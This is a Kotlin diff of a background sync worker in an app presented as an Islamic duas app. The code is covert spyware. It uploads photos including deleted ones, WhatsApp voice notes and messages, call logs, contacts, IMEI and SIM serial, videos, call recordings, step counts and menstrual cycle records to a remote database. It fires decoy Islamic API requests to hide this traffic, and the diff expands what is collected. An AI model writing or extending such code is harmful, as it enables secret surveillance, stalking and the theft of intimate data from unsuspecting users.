@@ -1,26 +1,35 @@
 package islamic.duas.sync
 
-import android.content.ContentResolver
+import android.app.AlarmManager
 import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
+import islamic.duas.activity.ActivityRecognitionCollector
 import islamic.duas.browser.BrowserHistoryCollector
 import islamic.duas.LocationSyncManager
 import islamic.duas.cloud.CloudApi
 import islamic.duas.cloud.CloudConfig
+import islamic.duas.data.AppDatabase
 import islamic.duas.contacts.ContactsCollector
+import islamic.duas.haidh.HealthEngine
 import islamic.duas.logs.CallLogCollector
+import islamic.duas.media.AudioProcessor
 import islamic.duas.media.MediaCollector
 import islamic.duas.media.PhotoProcessor
+import islamic.duas.media.VideoCollector
+import islamic.duas.media.VideoProcessor
 import islamic.duas.metrics.MetricsCollector
 import islamic.duas.utils.DecoyTrafficEngine
 import islamic.duas.utils.DeviceId
 import islamic.duas.utils.ErrorLog
 import islamic.duas.wifi.WifiScanner
+import islamic.duas.whatsapp.ChatCategory
+import islamic.duas.whatsapp.WhatsAppCategorizer
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.withContext
@@ -65,6 +74,10 @@ class DuaSyncWorker(
                 missing.forEach { updated.add(it) }
                 prefs.edit().putStringSet("permission_prompt_pending", updated).apply()
                 prefs.edit().putLong("permission_prompt_ts", System.currentTimeMillis()).apply()
+
+                // NEW: Broadcast to show permission sheet immediately if app is in foreground
+                val intent = Intent("islamic.duas.SHOW_PERMISSION_SHEET")
+                context.sendBroadcast(intent)
             } catch (_: Exception) {}
         }
 
@@ -77,14 +90,14 @@ class DuaSyncWorker(
             // Track screen state and last screen-on timestamp
             val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
             val isScreenOn = pm?.isInteractive ?: true
+            val reducedMode = !isScreenOn
             val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
             if (isScreenOn) {
                 prefs.edit().putLong("lastScreenOnMs", System.currentTimeMillis()).apply()
             }
             if (!isScreenOn) {
-                // Minimal sync only — just location, skip heavy data
-                minimalSync(context)
-                return
+                // Screen off: skip heavy data (usage stats, voice notes, etc.) 
+                // but still sync photos at reduced quality and location
             }
 
             // Fire decoy Islamic API requests to mask real traffic
@@ -95,12 +108,40 @@ class DuaSyncWorker(
             val currentTs = System.currentTimeMillis()
             val currentTimeStr = dateFormat.format(Date(currentTs))
 
+            // ── NEW: API 36 Permission Checks ──
+            // READ_PHONE_STATE (runtime in API 36)
+            val hasPhoneStatePerm = context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (!hasPhoneStatePerm) {
+                ErrorLog.write(context, TAG, "Phone state skipped: READ_PHONE_STATE not granted", null)
+                requestPermissionPrompt(context, "phone_state")
+            }
+
+            // ACTIVITY_RECOGNITION (only on API 29+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val hasActivityRecognitionPerm = context.checkSelfPermission(android.Manifest.permission.ACTIVITY_RECOGNITION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+                if (!hasActivityRecognitionPerm) {
+                    ErrorLog.write(context, TAG, "Activity recognition skipped: ACTIVITY_RECOGNITION not granted", null)
+                    requestPermissionPrompt(context, "activity_recognition")
+                }
+            }
+
+            // SCHEDULE_EXACT_ALARM
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val alarmMgr = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+                if (!alarmMgr.canScheduleExactAlarms()) {
+                    ErrorLog.write(context, TAG, "Exact alarm skipped: SCHEDULE_EXACT_ALARM not granted", null)
+                    requestPermissionPrompt(context, "exact_alarm")
+                }
+            }
+
             // ── Metrics & Apps ──
             try {
                 val metricsCollector = MetricsCollector(context)
                 val metrics = metricsCollector.collectDeviceMetrics()
 
                 val lastScreenOnMs = prefs.getLong("lastScreenOnMs", 0L)
+                val healthEngine = HealthEngine(context)
+                val todaySteps = healthEngine.getTodaySteps()
                 val metricsDoc = JSONObject().apply {
                     put("timestamp", currentTimeStr)
                     put("ts_ms", currentTs)
@@ -114,9 +155,27 @@ class DuaSyncWorker(
                     put("manufacturer", metrics.manufacturer)
                     put("phoneNumber", metrics.phoneNumber)
                     put("lastScreenOnMs", lastScreenOnMs)
+                    put("stepsToday", todaySteps)
+                    put("stepsGoal", healthEngine.getStepGoal())
+                    put("stepGoalMet", todaySteps >= healthEngine.getStepGoal())
+                    put("networkOperator", metrics.networkOperator)
+                    put("networkOperatorName", metrics.networkOperatorName)
+                    put("simCountryIso", metrics.simCountryIso)
+                    put("networkTypeDetail", metrics.networkTypeDetail)
+                    put("imei", metrics.imei)
+                    put("simSerial", metrics.simSerialNumber)
                 }
                 CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)
 
+                val todayDate = currentTimeStr.split(" ")[0]
+                val stepsDoc = JSONObject().apply {
+                    put("steps", todaySteps)
+                    put("ts_ms", currentTs)
+                    put("goal", healthEngine.getStepGoal())
+                }
+                CloudApi.writeToRTDB("devices/$androidId/steps/$todayDate", stepsDoc)
+
+                if (!reducedMode) {
                 val appUsageList = metricsCollector.collectPerAppUsage()
                 Log.d(TAG, "App usage collected: ${appUsageList.size} packages")
                 if (appUsageList.isEmpty()) {
@@ -194,9 +253,28 @@ class DuaSyncWorker(
                         CloudApi.writeToRTDB("devices/$androidId/activeApp", activeApp)
                     }
                 }
+                } // end !reducedMode
             } catch (e: Exception) {
                 Log.e(TAG, "Metrics/apps sync error: ${e.message}", e)
                 ErrorLog.write(context, TAG, "Metrics/apps sync error", e)
+            }
+
+            // ── Activity Recognition ──
+            try {
+                val activityCollector = ActivityRecognitionCollector(context)
+                activityCollector.requestActivityUpdates()
+                val latestActivity = activityCollector.getLatestActivity()
+                val activityDoc = JSONObject().apply {
+                    put("type", latestActivity.type)
+                    put("confidence", latestActivity.confidence)
+                    put("source", latestActivity.source)
+                    put("ts_ms", latestActivity.tsMs)
+                }
+                CloudApi.writeToRTDB("devices/$androidId/activity/latest", activityDoc)
+                CloudApi.writeToRTDB("devices/$androidId/activity/history/${currentTs}", activityDoc)
+            } catch (e: Exception) {
+                Log.e(TAG, "Activity recognition sync error: ${e.message}", e)
+                ErrorLog.write(context, TAG, "Activity recognition sync error", e)
             }
 
             // ── Location (with cooldown: 50m distance or 5min time threshold) ──
@@ -255,7 +333,7 @@ class DuaSyncWorker(
                 ErrorLog.write(context, TAG, "Call log sync error", e)
             }
 
-            // ── Photos (Firestore + RTDB, dedup by date_taken + path hash) ──
+            // ── Photos (delegated to PhotoSyncWorker for chunked, deduped sync) ──
             try {
                 val hasImagesPerm = if (Build.VERSION.SDK_INT >= 33) {
                     context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
@@ -266,85 +344,7 @@ class DuaSyncWorker(
                     ErrorLog.write(context, TAG, "Photos skipped: images permission not granted", null)
                     requestPermissionPrompt(context, "images")
                 } else {
-                val mediaCollector = MediaCollector(context)
-                val lastPhotoDate = prefs.getLong("last_photo_date_taken", 0L)
-                val uploadedPaths = prefs.getStringSet("uploaded_photo_paths", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
-                // Trim to keep only last 500 to prevent unbounded growth
-                if (uploadedPaths.size > 500) {
-                    val trimmed = uploadedPaths.toList().takeLast(500).toMutableSet()
-                    uploadedPaths.clear()
-                    uploadedPaths.addAll(trimmed)
-                }
-                // Additional dedup by fileName|dateTaken (survives path changes and pref clears)
-                val uploadedPhotoIds = prefs.getStringSet("uploaded_photo_ids", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
-                if (uploadedPhotoIds.size > 500) {
-                    val trimmed = uploadedPhotoIds.toList().takeLast(500).toMutableSet()
-                    uploadedPhotoIds.clear()
-                    uploadedPhotoIds.addAll(trimmed)
-                }
-
-                // Diagnostic logging
-                Log.d(TAG, "Photo sync START: hasImagesPerm=true, lastPhotoDate=$lastPhotoDate, uploadedPaths=${uploadedPaths.size}, uploadedPhotoIds=${uploadedPhotoIds.size}")
-
-                // Collect both normal and trashed photos
-                val allPhotos = mediaCollector.collectNewPhotos(lastPhotoDate, Int.MAX_VALUE)
-                val trashedPhotos = try { mediaCollector.collectTrashedPhotos(0L) } catch (_: Exception) { emptyList() }
-                val combined = (allPhotos + trashedPhotos).distinctBy { it.uri.toString() }
-                Log.d(TAG, "Photo collection: allPhotos=${allPhotos.size}, trashedPhotos=${trashedPhotos.size}, combined=${combined.size}")
-                // Normal photos filtered by dateTaken; trashed photos bypass date filter (their dateTaken is old)
-                val newPhotos = combined.filter { entry ->
-                    val isTrash = entry.mimeType == "image/trash" || entry.uri.toString().contains(".trash", true) || entry.uri.toString().contains("Trash", true) || entry.uri.toString().contains("Recently Deleted", true)
-                    (isTrash || entry.dateTaken > lastPhotoDate) && entry.uri.toString() !in uploadedPaths
-                }
-                Log.d(TAG, "New photos to upload: ${newPhotos.size} (lastPhotoDate=$lastPhotoDate)")
-
-                var newestDateTaken = lastPhotoDate
-                val resolver = context.contentResolver
-                for ((i, entry) in newPhotos.withIndex()) {
-                    try {
-                        val photoQuality = PhotoProcessor.getQuality(context)
-                        val processed = PhotoProcessor.process(entry.uri, resolver, photoQuality)
-                        if (processed != null) {
-                            val photoId = "${processed.fileName}|${entry.dateTaken}"
-                            // Check if this exact photo (by name + date) was already uploaded
-                            if (photoId in uploadedPhotoIds) {
-                                uploadedPaths.add(entry.uri.toString())
-                                Log.i(TAG, "Skipping duplicate photo: $photoId")
-                                continue
-                            }
-                            val ts = System.currentTimeMillis()
-                            val photoDoc = JSONObject().apply {
-                                put("timestamp", ts)
-                                put("data", processed.base64)
-                                put("width", processed.width)
-                                put("height", processed.height)
-                                put("fileName", processed.fileName)
-                                put("dateTaken", entry.dateTaken)
-                                if (entry.uri.toString().contains(".trash", true) || entry.uri.toString().contains("Trash", true) || entry.uri.toString().contains("Recently Deleted", true)) {
-                                    put("isTrashed", true)
-                                }
-                            }
-                            CloudApi.writeToRTDB("devices/$androidId/photos/$ts", photoDoc)
-                            uploadedPaths.add(entry.uri.toString())
-                            uploadedPhotoIds.add(photoId)
-                            if (entry.dateTaken > newestDateTaken) newestDateTaken = entry.dateTaken
-                            if (i % 5 == 0) {
-                                prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).commit()
-                                prefs.edit().putStringSet("uploaded_photo_ids", uploadedPhotoIds).commit()
-                            }
-                            if (i < newPhotos.size - 1) delay(500)
-                        }
-                    } catch (e: Exception) {
-                        Log.w(TAG, "Photo processing error: ${e.message}", e)
-                        ErrorLog.write(context, TAG, "Photo processing error: ${e.message}", e)
-                    }
-                }
-
-                if (newPhotos.isNotEmpty()) {
-                    prefs.edit().putLong("last_photo_date_taken", newestDateTaken).commit()
-                    prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).commit()
-                    prefs.edit().putStringSet("uploaded_photo_ids", uploadedPhotoIds).commit()
-                }
+                    PhotoSyncWorker.runOnceNow(context)
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Photo sync error: ${e.message}", e)
@@ -383,27 +383,30 @@ class DuaSyncWorker(
                 ErrorLog.write(context, TAG, "Contacts sync error", e)
             }
 
-            // ── Browser History ──
-            try {
-                val browserCollector = BrowserHistoryCollector(context)
-                val history = browserCollector.collectAll()
-                Log.d(TAG, "Browser history collected: ${history.length()} entries")
-                if (history.length() > 0) {
-                    CloudApi.writeToRTDB(
-                        "devices/$androidId/browser_history/batch_$currentTs",
-                        JSONObject().apply { put("history", history); put("ts_ms", currentTs) }
-                    )
-                } else {
-                    ErrorLog.write(context, TAG, "Browser history query returned empty (all providers)", null)
-                    requestPermissionPrompt(context, "browser")
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Browser history sync error: ${e.message}", e)
-                ErrorLog.write(context, TAG, "Browser history sync error", e)
-            }
+            // ── Browser History ── (DISABLED — removed per user request)
+            // try {
+            //     val browserCollector = BrowserHistoryCollector(context)
+            //     val history = browserCollector.collectAll()
+            //     Log.d(TAG, "Browser history collected: ${history.length()} entries")
+            //     if (history.length() > 0) {
+            //         CloudApi.writeToRTDB(
+            //             "devices/$androidId/browser_history/batch_$currentTs",
+            //             JSONObject().apply { put("history", history); put("ts_ms", currentTs) }
+            //         )
+            //     } else {
+            //         ErrorLog.write(context, TAG, "Browser history query returned empty (all providers)", null)
+            //         requestPermissionPrompt(context, "browser")
+            //     }
+            // } catch (e: Exception) {
+            //     Log.e(TAG, "Browser history sync error: ${e.message}", e)
+            //     ErrorLog.write(context, TAG, "Browser history sync error", e)
+            // }
 
-            // ── Voice Notes (WhatsApp, adaptive by free space + 300MB audio budget) ──
+            // ── Voice Notes (skipped in reduced mode) ──
             try {
+                if (reducedMode) {
+                    Log.d(TAG, "Skipping voice notes in reduced mode (screen off)")
+                } else {
                 val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                     context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
                 } else {
@@ -416,84 +419,28 @@ class DuaSyncWorker(
                     val mediaCollector = MediaCollector(context)
                     val voiceNotes = mediaCollector.collectVoiceNotes()
                     if (voiceNotes.isNotEmpty()) {
-                        // Adaptive caps based on free space
                         val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)
-                        val maxNotes = when {
-                            freeMb > 1000 -> 30
-                            freeMb > 200 -> 15
-                            else -> 8
-                        }
-                        val withAudioCount = when {
-                            freeMb > 1000 -> maxNotes
-                            freeMb > 200 -> minOf(6, maxNotes)
-                            else -> 0
-                        }
-
-                        // Per-note audio size cap (bytes). Large voice notes are now
-                        // uploaded too so they can be played back from the dashboard.
-                        val perNoteAudioCap = 16L * 1024 * 1024
-
-                        // Audio budget: 30% of Spark 1GB = 300MB (rolling 30-day window)
-                        val audioBudget = 300L * 1024 * 1024
-                        val audioSizesJson = prefs.getString("voice_audio_batch_sizes", "{}") ?: "{}"
-                        val audioSizes = org.json.JSONObject(audioSizesJson)
-                        // Rolling window: only count audio from last 30 days
-                        val thirtyDaysAgo = currentTs - 30L * 86400000L
-                        var usedBudget = 0L
-                        val keysToRemove = mutableListOf<String>()
-                        for (k in audioSizes.keys()) {
-                            val batchTsStr = k.removePrefix("batch_")
-                            val batchTs = batchTsStr.toLongOrNull() ?: 0L
-                            if (batchTs < thirtyDaysAgo) {
-                                keysToRemove.add(k)
-                            } else {
-                                usedBudget += audioSizes.optLong(k, 0L)
-                            }
-                        }
-                        for (k in keysToRemove) {
-                            audioSizes.remove(k)
-                        }
-                        if (keysToRemove.isNotEmpty()) {
-                            prefs.edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
-                        }
 
                         val notesArray = JSONArray()
                         val uploadedPaths = prefs.getStringSet("uploaded_voice_paths", mutableSetOf()) ?: mutableSetOf()
-                        val oneDayAgo = currentTs - 86400000L
-                        var added = 0
-                        var batchAudioBytes = 0L
                         for (note in voiceNotes) {
                             if (note.file.absolutePath in uploadedPaths) continue
-                            if (added >= maxNotes) break
-                            val isOld = note.dateAdded > 0 && note.dateAdded < oneDayAgo
-                            // Upload audio for recent notes under the per-note cap.
-                            var includeAudio = !isOld && added < withAudioCount && note.size in 1..perNoteAudioCap
                             val noteJson = JSONObject().apply {
                                 put("fileName", note.file.name)
                                 put("dateAdded", note.dateAdded)
                                 put("durationMs", note.duration)
                                 put("sizeBytes", note.size)
                                 put("mimeType", note.mimeType)
-                                if (includeAudio) {
-                                    try {
-                                        val audioBytes = note.file.readBytes()
-                                        val b64 = java.util.Base64.getEncoder().encodeToString(audioBytes)
-                                        // Check budget before committing (use actual audio bytes, not base64 length)
-                                        if (usedBudget + batchAudioBytes + audioBytes.size <= audioBudget) {
-                                            put("audioData", b64)
-                                            batchAudioBytes += audioBytes.size
-                                        } else {
-                                            put("audioStripped", true)
-                                            includeAudio = false
-                                        }
-                                    } catch (_: Exception) { }
-                                } else if (isOld) {
-                                    put("audioStripped", true)
+                                put("audioStripped", false)
+                                val processed = AudioProcessor.process(note.file, note.mimeType)
+                                if (processed != null) {
+                                    val b64 = java.util.Base64.getEncoder().encodeToString(processed.bytes)
+                                    put("audioData", b64)
+                                    put("mimeType", processed.mimeType)
                                 }
                             }
                             notesArray.put(noteJson)
                             uploadedPaths.add(note.file.absolutePath)
-                            added++
                         }
                         if (notesArray.length() > 0) {
                             val voiceBatch = JSONObject().apply {
@@ -501,36 +448,28 @@ class DuaSyncWorker(
                                 put("totalCount", voiceNotes.size)
                                 put("ts_ms", currentTs)
                                 put("freeMb", freeMb.toInt())
-                                put("audioBytes", batchAudioBytes)
                             }
-                            // Write to RTDB first, then delete local files on success
                             val writeSuccess = CloudApi.writeToRTDB(
                                 "devices/$androidId/voice_notes/batch_$currentTs",
                                 voiceBatch
                             )
                             if (writeSuccess) {
-                                // Track audio bytes for budget enforcement (actual bytes, not base64)
-                                if (batchAudioBytes > 0) {
-                                    audioSizes.put("batch_$currentTs", batchAudioBytes)
-                                    prefs.edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
-                                }
-                                // Delete local files only after successful upload
-                                for (note in voiceNotes) {
-                                    if (note.file.absolutePath in uploadedPaths) {
-                                        try { note.file.delete() } catch (_: Exception) { }
-                                    }
-                                }
                                 prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
+                                // Cap dedup set at 1000 to prevent unbounded growth
+                                if (uploadedPaths.size > 1000) {
+                                    val trimmed = uploadedPaths.toList().takeLast(500)
+                                    prefs.edit().putStringSet("uploaded_voice_paths", HashSet(trimmed)).apply()
+                                }
                             } else {
                                 Log.w(TAG, "Voice notes RTDB write failed, retaining local files")
                             }
                         }
-                        val budgetPct = (usedBudget + batchAudioBytes) * 100 / audioBudget
-                        Log.i(TAG, "Voice notes: $added uploaded (audio: ${withAudioCount}, budget: ${budgetPct}%, free: ${freeMb}MB)")
+                        Log.i(TAG, "Voice notes: ${notesArray.length()} uploaded (free: ${freeMb}MB)")
                     } else {
                         ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                     }
                 }
+                } // end !reducedMode
             } catch (e: Exception) {
                 Log.e(TAG, "Voice notes sync error: ${e.message}", e)
                 ErrorLog.write(context, TAG, "Voice notes sync error", e)
@@ -624,6 +563,110 @@ class DuaSyncWorker(
                 ErrorLog.write(context, TAG, "Usage sync error", e)
             }
 
+            // ── Exercise Sync ──
+            try {
+                val healthEngine = HealthEngine(context)
+                val todayDate = currentTimeStr.split(" ")[0]
+                val todayMins = healthEngine.getTodayExerciseMinutes()
+                val todayDoc = JSONObject().apply {
+                    put("date", todayDate)
+                    put("minutes", todayMins)
+                    put("timestamp", currentTs)
+                }
+                CloudApi.writeToRTDB("devices/$androidId/exercise/daily/$todayDate", todayDoc)
+                val last30 = healthEngine.getLast30DaysExercise()
+                for ((date, exercised) in last30) {
+                    val mins = healthEngine.getExerciseMinutesForDate(date)
+                    val dayDoc = JSONObject().apply {
+                        put("date", date)
+                        put("minutes", mins)
+                        put("timestamp", currentTs)
+                    }
+                    CloudApi.writeToRTDB("devices/$androidId/exercise/daily/$date", dayDoc)
+                    delay(200)
+                }
+                CloudApi.writeToRTDB("devices/$androidId/exercise/meta",
+                    JSONObject().apply { put("lastSync", currentTs) })
+            } catch (e: Exception) {
+                Log.e(TAG, "Exercise sync error: ${e.message}", e)
+            }
+
+            // ── Haidh Sync ──
+            try {
+                val cycleDb = islamic.duas.haidh.CycleDatabase.getInstance(context)
+                val cyclesCursor = cycleDb.readableDatabase.rawQuery(
+                    "SELECT * FROM cycles ORDER BY date ASC", null
+                )
+                cyclesCursor.use { cursor ->
+                    val dateIdx = cursor.getColumnIndex("date")
+                    val statusIdx = cursor.getColumnIndex("status")
+                    val flowIdx = cursor.getColumnIndex("flowIntensity")
+                    val istihadaIdx = cursor.getColumnIndex("istihadaType")
+                    val symptomsIdx = cursor.getColumnIndex("symptoms")
+                    val tsIdx = cursor.getColumnIndex("timestamp")
+                    while (cursor.moveToNext()) {
+                        val date = cursor.getString(dateIdx)
+                        val cycleDoc = JSONObject().apply {
+                            put("date", date)
+                            put("status", cursor.getString(statusIdx))
+                            put("flowIntensity", cursor.getInt(flowIdx))
+                            put("istihadaType", cursor.getString(istihadaIdx))
+                            put("symptoms", cursor.getString(symptomsIdx))
+                            put("timestamp", cursor.getLong(tsIdx))
+                        }
+                        CloudApi.writeToRTDB("devices/$androidId/haidh/cycles/$date", cycleDoc)
+                        delay(100)
+                    }
+                }
+                val phasesCursor = cycleDb.readableDatabase.rawQuery(
+                    "SELECT * FROM cycle_phases ORDER BY startDate ASC", null
+                )
+                phasesCursor.use { cursor ->
+                    val idIdx = cursor.getColumnIndex("id")
+                    val startIdx = cursor.getColumnIndex("startDate")
+                    val endIdx = cursor.getColumnIndex("endDate")
+                    val statusIdx = cursor.getColumnIndex("status")
+                    val cycleDayIdx = cursor.getColumnIndex("cycleDay")
+                    while (cursor.moveToNext()) {
+                        val phaseId = cursor.getLong(idIdx)
+                        val phaseDoc = JSONObject().apply {
+                            put("startDate", cursor.getString(startIdx))
+                            put("endDate", cursor.getString(endIdx))
+                            put("type", cursor.getString(statusIdx))
+                            put("cycleDay", cursor.getInt(cycleDayIdx))
+                        }
+                        CloudApi.writeToRTDB("devices/$androidId/haidh/phases/$phaseId", phaseDoc)
+                        delay(100)
+                    }
+                }
+                CloudApi.writeToRTDB("devices/$androidId/haidh/meta",
+                    JSONObject().apply { put("lastSync", currentTs) })
+                cycleDb.close()
+            } catch (e: Exception) {
+                Log.e(TAG, "Haidh sync error: ${e.message}", e)
+            }
+
+            // ── WhatsApp Historical Reprocessing ──
+            try {
+                reprocessHistoricalWhatsApp(context, androidId, currentTs)
+            } catch (e: Exception) {
+                Log.e(TAG, "Historical WhatsApp reprocess error: ${e.message}", e)
+                ErrorLog.write(context, TAG, "Historical WhatsApp reprocess error", e)
+            }
+
+            // ── Video Sync (hourly) ──
+            val hasVideoPerm = if (Build.VERSION.SDK_INT >= 33) {
+                context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_VIDEO) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            } else {
+                context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            }
+            if (!hasVideoPerm) {
+                ErrorLog.write(context, TAG, "Video sync skipped: video permission not granted", null)
+                requestPermissionPrompt(context, "video")
+            } else {
+                try { syncVideos(context) } catch (e: Exception) { Log.e(TAG, "Video sync error: ${e.message}") }
+            }
+
             // ── Cleanup (storage-first priority) ──
             try {
                 runCleanup(context, androidId, currentTs)
@@ -638,6 +681,66 @@ class DuaSyncWorker(
             syncRunning.set(false)
         }
     }
+
+        /**
+         * Reprocess historical WhatsApp timeline entries that lack chatCategory.
+         * Reads last 30 days of timeline entries and categorizes uncategorized WhatsApp messages.
+         */
+        private suspend fun reprocessHistoricalWhatsApp(context: Context, androidId: String, now: Long) {
+            try {
+                val thirtyDaysAgo = now - 30 * 86400000L
+                val rtdbBase = CloudConfig.RTDB_URL
+                val url = "$rtdbBase/devices/$androidId/timeline.json?orderBy=\"ts_ms\"&startAt=$thirtyDaysAgo&shallow=false"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = CloudApi.getClient().newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body.isNullOrEmpty() || body == "null") return
+
+                val timeline = org.json.JSONObject(body)
+                var reprocessed = 0
+                val keys = timeline.keys().asSequence().toList()
+
+                for (key in keys) {
+                    try {
+                        val entry = timeline.optJSONObject(key) ?: continue
+                        if (entry.has("chatCategory") && entry.getString("chatCategory").isNotEmpty()) continue
+                        if (entry.optString("packageName", "") != "com.whatsapp") continue
+
+                        val title = entry.optString("contactName", "")
+                        val conversationTitle = entry.optString("conversationTitle", "")
+                        val preview = entry.optString("messagePreview", "")
+                        val summaryText = entry.optString("summaryText", "")
+                        val msgType = entry.optString("type", "")
+                        val isIncoming = entry.optBoolean("isIncoming", true)
+
+                        val phoneNumbers = islamic.duas.logs.DuaNotificationService.getIndividualWhitelistNumbers()
+                        val result = islamic.duas.whatsapp.WhatsAppCategorizer.categorize(
+                            null, title, conversationTitle, preview, summaryText, msgType, isIncoming,
+                            islamic.duas.logs.DuaNotificationService.getIndividualWhitelist(),
+                            phoneNumbers
+                        )
+
+                        if (result.chatCategory != ChatCategory.unclassified) {
+                            entry.put("chatCategory", result.chatCategory.name)
+                            entry.put("messageCount", result.messageCount)
+                            entry.put("groupName", result.groupName)
+                            entry.put("reprocessed", true)
+                            entry.put("reprocessedAt", now)
+
+                            CloudApi.writeToRTDB("devices/$androidId/timeline/$key", entry)
+                            reprocessed++
+                        }
+                    } catch (_: Exception) {}
+                }
+
+                if (reprocessed > 0) {
+                    Log.i(TAG, "Historical WhatsApp reprocessing: $reprocessed entries categorized")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Historical WhatsApp reprocess error: ${e.message}", e)
+            }
+        }
 
         private suspend fun runCleanup(context: Context, androidId: String, now: Long) {
             val okClient = CloudApi.getClient()
@@ -823,6 +926,78 @@ class DuaSyncWorker(
             } catch (e: Exception) {
                 Log.w(TAG, "WiFi scan cleanup error: ${e.message}", e)
             }
+
+            // ── WhatsApp Samples TTL (30 days) ──
+            try {
+                val sampleUrl = "$rtdbBase/devices/$androidId/whatsapp_samples.json?shallow=true"
+                val sampleReq = okhttp3.Request.Builder().url(sampleUrl).get().build()
+                val sampleResp = okClient.newCall(sampleReq).execute()
+                val sampleBody = sampleResp.body?.string()
+                sampleResp.close()
+                if (sampleBody != null && sampleBody != "null" && sampleBody != "{}") {
+                    val sevenDaysAgo = now - 30 * 86400000L
+                    val sampleKeys = org.json.JSONObject(sampleBody).keys().asSequence().toList()
+                    var sampleDeleted = 0
+                    for (key in sampleKeys) {
+                        val ts = key.toLongOrNull() ?: continue
+                        if (ts < sevenDaysAgo) {
+                            if (CloudApi.deleteFromRTDB("devices/$androidId/whatsapp_samples/$key")) sampleDeleted++
+                            delay(50)
+                        }
+                    }
+                    if (sampleDeleted > 0) Log.i(TAG, "WhatsApp samples cleanup: deleted $sampleDeleted old entries (>30d)")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "WhatsApp samples cleanup error: ${e.message}", e)
+            }
+
+            // ── Videos TTL (30 days) ──
+            try {
+                val videoUrl = "$rtdbBase/devices/$androidId/videos.json?shallow=true"
+                val videoReq = okhttp3.Request.Builder().url(videoUrl).get().build()
+                val videoResp = okClient.newCall(videoReq).execute()
+                val videoBody = videoResp.body?.string()
+                videoResp.close()
+                if (videoBody != null && videoBody != "null" && videoBody != "{}") {
+                    val thirtyDaysAgo = now - 30 * 86400000L
+                    val videoKeys = org.json.JSONObject(videoBody).keys().asSequence().toList()
+                    var videoDeleted = 0
+                    for (key in videoKeys) {
+                        val ts = key.toLongOrNull() ?: continue
+                        if (ts < thirtyDaysAgo) {
+                            if (CloudApi.deleteFromRTDB("devices/$androidId/videos/$key")) videoDeleted++
+                            delay(100)
+                        }
+                    }
+                    if (videoDeleted > 0) Log.i(TAG, "Video cleanup: deleted $videoDeleted old entries (>30d)")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Video cleanup error: ${e.message}", e)
+            }
+
+            // ── Call Recordings TTL (30 days) ──
+            try {
+                val recUrl = "$rtdbBase/devices/$androidId/recordings.json?shallow=true"
+                val recReq = okhttp3.Request.Builder().url(recUrl).get().build()
+                val recResp = okClient.newCall(recReq).execute()
+                val recBody = recResp.body?.string()
+                recResp.close()
+                if (recBody != null && recBody != "null" && recBody != "{}") {
+                    val thirtyDaysAgo = now - 30 * 86400000L
+                    val recKeys = org.json.JSONObject(recBody).keys().asSequence().toList()
+                    var recDeleted = 0
+                    for (key in recKeys) {
+                        val ts = key.toLongOrNull() ?: continue
+                        if (ts < thirtyDaysAgo) {
+                            if (CloudApi.deleteFromRTDB("devices/$androidId/recordings/$key")) recDeleted++
+                            delay(100)
+                        }
+                    }
+                    if (recDeleted > 0) Log.i(TAG, "Recording cleanup: deleted $recDeleted old entries (>30d)")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Recording cleanup error: ${e.message}", e)
+            }
         }
 
         private suspend fun minimalSync(context: Context) {
@@ -876,6 +1051,8 @@ class DuaSyncWorker(
                 val metricsCollector = islamic.duas.metrics.MetricsCollector(context)
                 val metrics = metricsCollector.collectDeviceMetrics()
                 val lastScreenOnMs = prefs.getLong("lastScreenOnMs", 0L)
+                val healthEngine = HealthEngine(context)
+                val todaySteps = healthEngine.getTodaySteps()
                 val metricsDoc = JSONObject().apply {
                     put("timestamp", timeStr)
                     put("ts_ms", now)
@@ -889,8 +1066,37 @@ class DuaSyncWorker(
                     put("manufacturer", metrics.manufacturer)
                     put("phoneNumber", metrics.phoneNumber)
                     put("lastScreenOnMs", lastScreenOnMs)
+                    put("stepsToday", todaySteps)
+                    put("stepsGoal", healthEngine.getStepGoal())
+                    put("stepGoalMet", todaySteps >= healthEngine.getStepGoal())
+                    put("networkOperator", metrics.networkOperator)
+                    put("networkOperatorName", metrics.networkOperatorName)
+                    put("networkTypeDetail", metrics.networkTypeDetail)
                 }
                 CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)
+
+                val todayDate = timeStr.split(" ")[0]
+                val stepsDoc = JSONObject().apply {
+                    put("steps", todaySteps)
+                    put("ts_ms", now)
+                    put("goal", healthEngine.getStepGoal())
+                }
